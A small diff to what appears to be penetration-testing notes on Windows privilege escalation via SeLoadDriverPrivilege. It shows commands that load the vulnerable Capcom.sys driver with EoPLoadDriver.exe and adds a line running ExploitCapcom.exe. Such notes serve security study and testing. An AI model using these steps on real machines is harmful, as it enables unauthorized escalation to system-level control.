@@ -31,6 +31,7 @@ cat drivers.txt | Select-String -pattern Capcom
 # Automation
 ```powershell
 EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+.\ExploitCapcom.exe
 ```
 
 # EnableSeLoadDriverPrivilege
